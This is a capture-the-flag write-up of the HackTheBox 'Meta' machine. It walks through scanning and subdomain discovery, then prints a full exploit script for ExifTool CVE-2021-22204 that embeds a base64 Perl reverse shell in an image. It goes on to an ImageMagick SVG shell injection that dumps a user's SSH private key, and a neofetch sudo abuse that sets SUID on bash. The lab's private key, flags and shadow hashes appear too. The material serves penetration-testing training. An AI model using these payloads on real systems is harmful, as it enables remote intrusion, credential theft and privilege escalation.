#### HackTheBox | Meta ####

## Reconnaissance:

Find The Open Port with Masscan...
````
┌─[rce@parrot]─[~]
└──╼ $sudo masscan -p1-65535,U:1-65535 --rate=500 -e tun0 10.129.140.55
[sudo] password for rce: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-24 00:39:24 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.129.140.55                                   
Discovered open port 22/tcp on 10.129.140.55 

````
## Enumeration:

Find what service running and what is the current service version..
````
┌─[rce@parrot]─[~]
└──╼ $nmap -sC -sV -Pn -vvv 10.129.140.55
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 18:39 CST
Initiating Connect Scan at 18:39
Scanning 10.129.140.55 [1000 ports]
Discovered open port 80/tcp on 10.129.140.55
Discovered open port 22/tcp on 10.129.140.55
Completed Connect Scan at 18:39, 22.02s elapsed (1000 total ports)
Initiating Service scan at 18:39
Scanning 2 services on 10.129.140.55
Completed Service scan at 18:39, 6.50s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.140.55.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:39
Completed NSE at 18:39, 7.82s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:39
Completed NSE at 18:39, 1.15s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:39
Completed NSE at 18:39, 0.00s elapsed
Nmap scan report for 10.129.140.55
Host is up, received user-set (0.25s latency).
Scanned at 2022-01-23 18:39:20 CST for 38s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiNHVBq9XNN5eXFkQosElagVm6qkXg6Iryueb1zAywZIA4b0dX+5xR5FpAxvYPxmthXA0E7/wunblfjPekyeKg+lvb+rEiyUJH25W/In13zRfJ6Su/kgxw9whZ1YUlzFTWDjUjQBij7QSMktOcQLi7zgrkG3cxGcS39SrEM8tvxcuSzMwzhFqVKFP/AM0jAxJ5HQVrkXkpGR07rgLyd+cNQKOGnFpAukUJnjdfv9PsV+LQs9p+a0jID+5B9y5fP4w9PvYZUkRGHcKCefYk/2UUVn0HesLNNrfo6iUxu+eeM9EGUtqQZ8nXI54nHOvzbc4aFbxADCfew/UJzQT7rovB
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEDINAHjreE4lgZywOGusB8uOKvVDmVkgznoDmUI7Rrnlmpy6DnOUhov0HfQVG6U6B4AxCGaGkKTbS0tFE8hYis=
|   256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdX83J9TLR63TPxQSvi3CuobX8uyKodvj26kl9jWUSq
80/tcp open  http    syn-ack Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

````


## Port 80 http-Service:


## Gobuster Directory Find:
````
┌─[rce@parrot]─[~/Desktop]
└──╼ $gobuster dir -u http://artcorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://artcorp.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/23 18:44:15 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 234] [--> http://artcorp.htb/assets/]
/css                  (Status: 301) [Size: 231] [--> http://artcorp.htb/css/]   
/server-status        (Status: 403) [Size: 199]
````

## Sub-Domain Enumeration:
````
┌─[rce@parrot]─[~/Desktop]
└──╼ $wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://artcorp.htb" -H "Host: FUZZ.artcorp.htb" --hw 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://artcorp.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000001:   301        0 L      0 W        0 Ch        "www"                                              
000000007:   301        0 L      0 W        0 Ch        "webdisk"                                          
000000015:   301        0 L      0 W        0 Ch        "ns"                                               
000000031:   301        0 L      0 W        0 Ch        "mobile"                                           
000000003:   301        0 L      0 W        0 Ch        "ftp"                                              
000000035:   301        0 L      0 W        0 Ch        "cp"
<!----====SNIP====---->
000001492:   200        9 L      24 W       247 Ch      "dev01" 

Total time: 0
Processed Requests: 4989
Filtered Requests: 0
Requests/sec.: 0
````

## Add Hosts File:
````
┌─[rce@parrot]─[~/Desktop]
└──╼ $cat /etc/hosts | grep 'artcorp.htb'
10.129.140.55   artcorp.htb  dev01.artcorp.htb
````

## Website View:
````
$ http://dev01.artcorp.htb/

````
````
ArtCorp dev environment

Currently applications in development:

MetaView

* Only applications ready to be tested are listed

````


## Directory Search:
````
┌─[rce@parrot]─[~/Desktop]
└──╼ $dirsearch -u http://dev01.artcorp.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220521

Output File: /home/rce/.dirsearch/reports/dev01.artcorp.htb/_22-01-23_19-23-51.txt

Error Log: /home/rce/.dirsearch/logs/errors-22-01-23_19-23-51.log

Target: http://dev01.artcorp.htb/

[19:23:52] Starting: 
[19:36:51] 403 -  199B  - /server-status

Task Completed
````

## ExifTool Vulnerability (CVE-2021-22204):

URL: "http://dev01.artcorp.htb/metaview/index.php"
````
MetaView

Upload your image to display related metadata.
payload.jpg

File Type                       : JPEG (multi-page)
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Subfile Type                    : Single-page image
DjVu Version                    : 0.24
Spatial Resolution              : 100
Gamma                           : 2.2
Orientation                     : Unknown (0)
Included File ID                : shared_anno.iff
Author                          : .
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Image Width                     : 8
Image Height                    : 8
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)

````
## Exiftool Exploit:

Reference=> https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/

python3 exiftool exploit tool=> https://github.com/LazyTitan33/CVE-2021-22204



````
#!/usr/bin/python3
#
# Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image. 
# Fixed starting with version 10.40-1+deb9u1.
# 
# This script installs all the required software and generates all the required files for creating an RCE image file to exploit CVE-2021-22204.
#
# Title: ExifTool CVE-2021-22204 - Remote Code Execution
# Written by: LazyTitan33
#
# https://github.com/LazyTitan33
#
# Original research here: https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html

from PIL import Image
import subprocess
import base64
import os
 

ip = '127.0.0.1' # change this
port = '1337' # change this


img = Image.new('RGB', (50, 50), color = 'red')
img.save('payload.jpg')

payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"
payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/bash -i');}};".encode() )
payload = payload + b"'))};\")"

payload_file = open('payload', 'w')
payload_file.write(payload.decode('utf-8'))
payload_file.close()

filename = "configfile"
content = '''%Image::ExifTool::UserDefined = (
    # All EXIF tags are added to the Main table, and WriteGroup is used to
    # specify where the tag is written (default is ExifIFD if not specified):
    'Image::ExifTool::Exif::Main' => {
        # Example 1.  EXIF:NewEXIFTag
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
        # add more user-defined EXIF tags here...
    },
);
1; #end%
'''

with open(filename, 'w') as f:
    print(content, file=f)

subprocess.call(['sudo', 'apt', 'install', '-y', 'djvulibre-bin', 'exiftool'], stdout=open(os.devnull, 'wb'), stderr=open(os.devnull, 'wb'))
subprocess.call(['bzz', 'payload', 'payload.bzz'], stdout=open(os.devnull, 'wb'), stderr=open(os.devnull, 'wb'))
subprocess.call(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'], stdout=open(os.devnull, 'wb'), stderr=open(os.devnull, 'wb'))
subprocess.call(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'payload.jpg'], stdout=open(os.devnull, 'wb'), stderr=open(os.devnull, 'wb'))


print(''',-.___,-.
\_/_ _\_/  
  )O_O(    payload.jpg image is ready to be used.
 { (_) }   
  `-^-' 
Art by Hayley Jane Wakenshaw''')

````

(change the "ip_address" and "port")

Now Run the code..then the script give you payload.jpg put on the website..and set the Netcat listener and you get back revere connect.


## NetCat:
````
┌──[rce@parrot]─[~/Desktop]
└──╼ $nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.17.169] from (UNKNOWN) [10.129.140.55] 41480
bash: cannot set terminal process group (659): Inappropriate ioctl for device
bash: no job control in this shell

www-data@meta:/var/www/dev01.artcorp.htb/metaview$ whoami;id
whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
````

## User Enumeration:

````
www-data@meta:/var/www$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
````

Run the Linpeas script and see the what services are running in background..
````
[+] Services
[i] Search for outdated versions
 [ - ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  networking
 [ + ]  open-vm-tools
 [ + ]  procps
 [ + ]  rsyslog
 [ + ]  ssh
 [ - ]  sudo
 [ + ]  udev
 [ - ]  x11-common
````

## Cron:
````
2022/01/22 16:07:01 CMD: UID=1000 PID=11281  | /bin/sh -c /usr/local/bin/convert_images.sh
2022/01/22 16:07:01 CMD: UID=0    PID=11283  |
2022/01/22 16:07:01 CMD: UID=1000 PID=11284  | /usr/local/bin/mogrify -format png *.*
2022/01/22 16:07:01 CMD: UID=0    PID=11285  | /bin/sh -c rm /tmp/*
2022/01/22 16:07:01 CMD: UID=1000 PID=11286  | pkill mogrify
````
````
www-data@meta:/var/www$ cat /usr/local/bin/convert_images.sh
cat /usr/local/bin/convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
````

## imagemagick-shell-injection:

Reference=> "https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html"

````
www-data@meta:/tmp$ echo $PATH=/dev/shm
echo $PATH=/dev/shm

www-data@meta:/dev/shm$ cat /tmp/poc.svg
cat /tmp/poc.svg
<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/key`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>

www-data@meta:/dev/shm$ cp /tmp/poc.svg /var/www/dev01.artcorp.htb/convert_images/
s/ /tmp/poc.svg /var/www/dev01.artcorp.htb/convert_images

www-data@meta:/dev/shm$ ls -la /var/www/dev01.artcorp.htb/convert_images/
ls -la /var/www/dev01.artcorp.htb/convert_images/
total 12
drwxrwxr-x 2 root     www-data 4096 Jan 23 11:00 .
drwxr-xr-x 4 root     root     4096 Oct 18 14:27 ..
-rw-r--r-- 1 www-data www-data  412 Jan 23 11:00 poc.svg

www-data@meta:/dev/shm$ ls -la
ls -la
total 4
drwxrwxrwt  2 root   root     60 Jan 23 11:01 .
drwxr-xr-x 16 root   root   3080 Jan 23 00:59 ..
-rw-r--r--  1 thomas thomas 2590 Jan 23 11:01 key

www-data@meta:/dev/shm$ cat key
cat key
-----BEGIN OPENSSH PRIVATE KEY-----
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
bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
-----END OPENSSH PRIVATE KEY-----

┌─[rce@parrot]─[~/Desktop]
└──╼ $ssh -i id_rsa thomas@artcorp.htb
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

thomas@meta:~$ ls -la
total 36
drwxr-xr-x 5 thomas thomas 4096 Jan 23 11:07 .
drwxr-xr-x 3 root   root   4096 Aug 29 15:42 ..
lrwxrwxrwx 1 root   root      9 Aug 29 16:00 .bash_history -> /dev/null
-rw-r--r-- 1 thomas thomas  220 Aug 29 15:42 .bash_logout
-rw-r--r-- 1 thomas thomas 3526 Aug 29 15:42 .bashrc
drwxr-xr-x 3 thomas thomas 4096 Aug 30 13:01 .config
drwx------ 3 thomas thomas 4096 Jan 23 11:07 .gnupg
-rw-r--r-- 1 thomas thomas  807 Aug 29 15:42 .profile
drwx------ 2 thomas thomas 4096 Jan  4 10:22 .ssh
-rw-r----- 1 thomas thomas   33 Jan 23 01:00 user.txt

thomas@meta:~$ cat user.txt
bbcf1592ac69a385673572c29a5cab21
```` 

## Privilage and Escape:
````
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"


thomas@meta:~$ export XDG_CONFIG_HOME="$HOME/.config"

thomas@meta:~$ echo "chmod u+s /bin/bash" > /home/thomas/.config/neofetch/config.conf

thomas@meta:~$ sudo /usr/bin/neofetch \"\"
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 10 hours, 14 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 137MiB / 1994MiB 
  `Y$$
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""

thomas@meta:~$ /bin/bash -p

bash-5.0# whoami;id
root
uid=1000(thomas) gid=1000(thomas) euid=0(root) groups=1000(thomas)

bash-5.0# cd /root

bash-5.0# ls -la
total 28
drwx------  4 root root 4096 Jan 23 01:00 .
drwxr-xr-x 18 root root 4096 Aug 29 15:38 ..
lrwxrwxrwx  1 root root    9 Aug 29 16:00 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  2 root root 4096 Aug 30 13:01 conf
drwxr-xr-x  4 root root 4096 Jan  4 10:10 .config
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rwxr-----  1 root root   33 Jan 23 01:00 root.txt

bash-5.0# cat root.txt
593b045e997e6ff90c1a69c13411514a



bash-5.0# cat /etc/shadow
root:$6$C2RdQ0RpQ545cx/2$TMbXaoMwVs7XQVOwEwAnzcUVrIR5CdpVaM3Aoml8p9PWQWvxbrGrh/Y6d2.OuKlSHVsNVS0mJwSoGl.q8Pbug0:18996:0:99999:7:::
daemon:*:18868:0:99999:7:::
bin:*:18868:0:99999:7:::
sys:*:18868:0:99999:7:::
sync:*:18868:0:99999:7:::
games:*:18868:0:99999:7:::
man:*:18868:0:99999:7:::
lp:*:18868:0:99999:7:::
mail:*:18868:0:99999:7:::
news:*:18868:0:99999:7:::
uucp:*:18868:0:99999:7:::
proxy:*:18868:0:99999:7:::
www-data:*:18868:0:99999:7:::
backup:*:18868:0:99999:7:::
list:*:18868:0:99999:7:::
irc:*:18868:0:99999:7:::
gnats:*:18868:0:99999:7:::
nobody:*:18868:0:99999:7:::
_apt:*:18868:0:99999:7:::
systemd-timesync:*:18868:0:99999:7:::
systemd-network:*:18868:0:99999:7:::
systemd-resolve:*:18868:0:99999:7:::
messagebus:*:18868:0:99999:7:::
sshd:*:18868:0:99999:7:::
thomas:$6$o9BOgtwY3IprrRDV$XYl/9PCVNGrrjrriDeNqcI7KobY3HlICXTRydbpcy2ynBzsLyHg9yqlK10xeKjIzRZ6zVoMJFADDjop/h1vnU.:18868:0:99999:7:::
systemd-coredump:!!:18868::::::

````
